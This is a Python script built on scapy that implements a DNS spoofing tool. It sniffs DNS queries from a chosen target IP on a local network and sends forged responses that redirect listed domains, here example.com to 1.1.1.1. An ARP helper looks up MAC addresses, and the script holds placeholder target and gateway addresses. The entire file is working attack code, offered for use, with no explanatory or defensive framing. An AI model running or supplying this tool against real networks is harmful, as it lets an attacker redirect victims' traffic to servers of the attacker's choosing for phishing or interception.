#!/usr/bin/env python3

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send, sendp, Ether, ARP, srp, get_if_hwaddr, get_if_addr, conf
import sys
import os
import time

class DNSSpoofer:
    def __init__(self, interface, target_ip, gateway_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.dns_records = {
            "example.com": "1.1.1.1"
        }

        self.attacker_mac = get_if_hwaddr(interface)
        self.attacker_ip = get_if_addr(interface)

        self.spoofing = False

    def get_mac(self, ip):
        '''
        Get the MAC address of the target or gateway
        '''
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        try:
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            pass

    def handle_dns_request(self, pkt):
        # Extract domain name from DNSQR
        domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
        print(domain)

        if domain in self.dns_records:
            # Check if we have a spoofed record for this domain
            print(f"[*] Intercepted DNS request for: {domain}")

            spoofed_ip = self.dns_records[domain]
            # Create DNS response packet
            answers = [DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofed_ip, ttl=60)] * 6
            
            dns_response = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / \
                            IP(dst=pkt[IP].src, src=pkt[IP].dst, flags="DF") / \
                            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                            DNS(id=pkt[DNS].id,
                                qr=1, aa=0, rd=1, ra=1,
                                qd=pkt[DNS].qd,
                                an=answers)

            # Send the spoofed response
            sendp(dns_response, iface=self.interface, verbose=False)
            print(f"[+] Sent spoofed DNS response for {domain}")

    def start(self):
        self.spoofing = True
        print(f"[*] Starting DNS spoofing...")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Gateway: {self.gateway_ip}")
        print(f"[*] Spoofed DNS records: {self.dns_records}")

        try:
            while self.spoofing:
            # Sniff for DNS requests with a timeout to make it non-blocking
                sniff(filter=f"udp port 53 and host {self.target_ip}",
                    prn=self.handle_dns_request,
                    store=0,
                    iface=self.interface,
                    stop_filter=lambda p: not self.spoofing,
                    timeout=1)
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"[!] Error in DNS spoofing: {e}")
            self.stop()

    def stop(self):
        print("\n[*] Stopping DNS spoofing...")
        self.spoofing = False


if __name__ == "__main__":
    # Example usage
    interface = "en0"  # Change this to your network interface
    target_ip = "192.168.0.189"  # Change this to your target's IP
    gateway_ip = "192.168.0.1"  # Change this to your gateway's IP
    # Dictionary of domains to spoof and their fake IP addresses

    spoofer = DNSSpoofer(interface, target_ip, gateway_ip)
    spoofer.start()
